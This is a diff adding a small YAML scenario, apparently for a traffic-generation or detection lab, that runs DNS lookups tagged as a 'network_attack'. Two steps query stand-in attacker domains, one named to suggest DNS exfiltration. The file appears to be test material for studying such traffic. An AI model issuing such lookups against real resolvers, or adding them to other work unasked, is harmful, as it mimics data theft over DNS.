@@ -1,0 +1,18 @@
+builder: simple_dns
+protocol: udp
+metadata:
+  name: "Simple DNS Lookup"
+  description: "Demo DNS query/response pairs"
+  category: "network_attack"
+  difficulty_hint: "easy"
+parameters:
+  dns_server:
+    default: "8.8.8.8"
+    description: "DNS server IP"
+steps:
+  - action: dns_lookup
+    domain: "example.com"
+  - action: dns_lookup
+    domain: "malicious.evil.com"
+  - action: dns_lookup
+    domain: "data.exfil.attacker.com"
